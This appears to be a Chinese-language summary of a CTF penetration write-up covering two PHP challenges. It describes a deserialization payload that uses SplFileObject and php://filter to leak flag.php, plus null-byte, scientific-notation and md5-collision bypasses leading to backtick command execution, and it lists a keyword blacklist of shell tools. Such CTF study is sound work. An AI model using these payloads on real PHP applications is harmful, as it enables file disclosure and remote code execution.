## 备注

原文(https://www.ctfiot.com/285298.html)给出两道渗透组赛题源码+payload,正文附9张图(仅URL,无内嵌内容)。

### 题目1: 源码审计

风景欣赏网站源码,class A与class B定义,`unserialize($_POST['un'])`触发`A.__wakeup()`:
- A.__construct(): `new $this->username($this->password)` 然后 foreach 输出
- A.__wakeup(): 同上
- username='SplFileObject'(SPL内置), password='php://filter/read=convert.base64-encode/resource=flag.php'
- 反序列化触发__wakeup→SplFileObject接受filename参数打开php://filter流→foreach读取为字符串行→echo输出base64编码的flag.php源码

### 题目2: 源码审计+RCE

- ereg("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE → 用9e9%00*-*触发NULL截断
- strlen($_GET['password']) < 8 && $_GET['password'] > 9999999 → 9e9科学计数法绕过
- strpos($_GET['password'], '*-*') !== FALSE → 包含*-*子串
- preg_match黑名单含 ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|'|"|`|;|,|*|?|\|\\|n|t|r|xA0|{|}|(|)|&[^d]|@|||\$|[|]|{|}|(|)|-|<|>
- eval(`$cmd`) → 用反引号执行命令
- (string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b']) → md5强类型碰撞
